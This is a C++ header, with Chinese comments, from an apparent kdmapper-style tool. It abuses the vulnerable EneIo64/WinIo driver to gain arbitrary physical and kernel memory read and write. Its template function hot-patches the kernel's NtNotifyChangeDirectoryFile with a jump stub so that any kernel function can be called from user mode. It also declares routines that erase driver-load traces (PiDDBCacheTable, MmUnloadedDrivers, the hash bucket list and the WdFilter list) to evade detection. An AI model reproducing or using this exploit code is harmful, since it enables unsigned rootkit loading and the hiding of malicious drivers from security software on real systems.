#pragma once
#include <Windows.h>
#include <string>
#include <iostream>

#include "utils.hpp"
#include "nt.hpp"

// 定义PHYSICAL_ADDRESS类型（如果nt.hpp中没有定义）
#ifndef PHYSICAL_ADDRESS
typedef LARGE_INTEGER PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;
#endif

namespace eneio64_driver
{
    // 全局变量：ntoskrnl.exe基地址
    extern ULONG64 ntoskrnlAddr;
    
    // EneIo64驱动的IOCTL代码定义
    // 基于文档分析，映射物理内存的控制码为0x80102040，取消映射为0x80102044
    constexpr DWORD IOCTL_ENEIO64_MAP_USER_PHYSICAL_MEMORY = 0x80102040;
    constexpr DWORD IOCTL_ENEIO64_UNMAP_USER_PHYSICAL_MEMORY = 0x80102044;
    
    // EneIo64驱动的设备名称
    constexpr const wchar_t ENEIO64_DEVICE_NAME[] = L"\\\\.\\WinIo";
    
    extern ULONG64 ntoskrnlAddr;

    // EneIo64物理内存信息结构体，基于文档中的MAP_PHYSICAL_MEMORY_INFO
    #pragma pack(push, 1)
    typedef struct _ENEIO64_PHYSICAL_MEMORY_INFO {
        LARGE_INTEGER Size;              // 映射大小
        PHYSICAL_ADDRESS PhysicalAddress; // 物理地址
        PVOID hSection;                  // 节句柄
        PVOID pMappedAddress;           // 映射后的地址
        PVOID pObject;                  // 对象指针
    } ENEIO64_PHYSICAL_MEMORY_INFO, *PENEIO64_PHYSICAL_MEMORY_INFO;
    #pragma pack(pop)

    // 驱动管理函数
    bool IsRunning();
    HANDLE Load();
    bool Unload(HANDLE device_handle);

    // 内存操作函数
    bool ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
    bool WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
    bool WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size);
    
    // 物理内存映射函数
    PVOID MapPhysicalMemory(HANDLE device_handle, uint64_t physical_address, uint32_t size, PVOID* object, HANDLE* section);
    void UnmapPhysicalMemory(HANDLE device_handle, PVOID mapped_address, PVOID object, HANDLE section);
    
    // 虚拟地址转物理地址（需要实现）
    bool GetPhysicalAddress(HANDLE device_handle, uint64_t virtual_address, uint64_t* out_physical_address);
    
    // 内存分配和保护功能
    uint64_t MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size);
    bool MmFreeIndependentPages(HANDLE device_handle, uint64_t address, uint32_t size);
    BOOLEAN MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect);
    
    // 内核模块导出函数查找
    uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name);
    
    // 清理功能
    bool ClearPiDDBCacheTable(HANDLE device_handle);
    bool ClearMmUnloadedDrivers(HANDLE device_handle);
    bool ClearKernelHashBucketList(HANDLE device_handle);
    bool ClearWdFilterDriverList(HANDLE device_handle);
    
    // 其他辅助函数
    bool MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size);
    bool SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size);
    uint64_t AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size);
    bool FreePool(HANDLE device_handle, uint64_t address);
    
    // 连续物理内存分配函数 - 根据参考文档第3.4节添加
    uint64_t MmAllocateContiguousMemory(HANDLE device_handle, SIZE_T NumberOfBytes);
    uint64_t MmAllocatePagesForMdlEx(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes, nt::MEMORY_CACHING_TYPE CacheType, nt::MEMORY_ALLOCATE_FLAG Flags);
    uint64_t MmMapLockedPagesSpecifyCache(HANDLE device_handle, uint64_t mdl, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, PVOID RequestedAddress, BOOLEAN BugCheckOnFailure, nt::MM_PAGE_PRIORITY Priority);
    bool MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t mdl, ULONG new_protect);
    void MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t mdl);
    void MmFreePagesFromMdl(HANDLE device_handle, uint64_t mdl);
    
    // 内核函数调用模板（与intel_driver保持一致的接口）
    template<typename T, typename ...A>
    bool CallKernelFunction(HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments) {
        constexpr auto call_void = std::is_same_v<T, void>;

        // 修改为支持9个参数（NtNotifyChangeDirectoryFile有9个参数）
        static_assert(sizeof...(A) <= 9, "CallKernelFunction: Too many arguments, CallKernelFunction only can be called with 9 or less arguments");

        if constexpr (!call_void) {
            if (!out_result)
                return false;
        }
        else {
            UNREFERENCED_PARAMETER(out_result);
        }

        if (!kernel_function_address)
            return false;

        // 设置函数调用
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll == 0) {
            std::cout << "[-] Failed to load ntdll.dll" << std::endl;
            return false;
        }

        // NtAddAtom参数个数过少，使得用R3到R0时复制的数据少，四个之内使用rcx,rdx,r8和r9，多于四个使用内存栈，因此在使用NtAddAtom作为跳转函数时
        // MmAllocatePagesForMdlEx(6个参数)和MmMapLockedPagesSpecifyCache(6个参数)会导致后边的参数在进入内核时并未复制，因此而调用失败
        // 而NtNotifyChangeDirectoryFile有9个参数
        // Win10 有NtNotifyChangeDirectoryFileEx而Win7没有，但Win7有NtNotifyChangeDirectoryFile(9个参数)
        const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtNotifyChangeDirectoryFile"));
        if (!NtAddAtom)
        {
            std::cout << "[-] Failed to get export ntdll.NtNotifyChangeDirectoryFile" << std::endl;
            return false;
        }

        uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
        uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
        *(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;

        static uint64_t kernel_NtAddAtom = GetKernelModuleExport(device_handle, eneio64_driver::ntoskrnlAddr, "NtNotifyChangeDirectoryFile");
        if (!kernel_NtAddAtom) {
            std::cout << "[-] Failed to get export ntoskrnl.NtNotifyChangeDirectoryFile" << std::endl;
            return false;
        }

        if (!ReadMemory(device_handle, kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
            return false;

        if (original_kernel_function[0] == kernel_injected_jmp[0] &&
            original_kernel_function[1] == kernel_injected_jmp[1] &&
            original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
            original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
            std::cout << "[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl;
            return false;
        }

        // 用kernel_function_address覆盖指针
        if (!WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
            return false;

        // 调用函数
        if constexpr (!call_void) {
            using FunctionFn = T(__stdcall*)(A...);
            const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

            *out_result = Function(arguments...);
        }
        else {
            using FunctionFn = void(__stdcall*)(A...);
            const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

            Function(arguments...);
        }

        // 恢复指针/跳转
        return WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
    }
}